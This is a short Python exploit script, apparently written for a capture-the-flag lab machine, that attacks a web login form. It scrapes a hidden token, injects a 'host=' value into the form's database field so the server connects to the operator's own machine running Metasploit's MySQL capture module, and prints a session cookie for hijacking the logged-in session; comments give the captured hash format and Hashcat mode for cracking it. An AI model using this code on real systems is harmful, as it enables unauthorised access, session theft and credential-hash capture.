#!/usr/bin/python
# -*- coding: utf​-8​ -*-
__author__ = 'artikrh'
import requests, re, socket
import netifaces as ni
from sys import exit
from bs4 import BeautifulSoup

"""
- Requires Metasploit's auxiliary/server/capture/mysql
- Hash format: $mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
- Hashcat code: 11200
"""

def main(ip):
    s = requests.session()

    fetchtoken = s.get('http://10.10.10.129/').text
    soup = BeautifulSoup(fetchtoken, features="lxml")
    hidden_tags = soup.find_all("input", type="hidden")
    match = re.findall(r"([a-fA-F\d]{64})", str(hidden_tags[-1]))
    token = match[0]

    data = 'username=admin&password=admin&db=cryptor;host={}&token={}&login='.format(ip,token)
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = s.post('http://10.10.10.129/', headers=headers, data=data, verify=False)
    phpsessid = requests.utils.dict_from_cookiejar(s.cookies)['PHPSESSID']
    print '[*] Save this valid PHPSESSID cookie to your browser through inspect element: {}'.format(phpsessid)

def check(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((ip,3306))
    if result != 0:
        print '[*] MySQL is not remotely accessible! Exiting...'
        exit()
    sock.close()

if __name__ == '__main__':
    ni.ifaddresses('tun0')
    ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
    check(ip)
    main(ip)
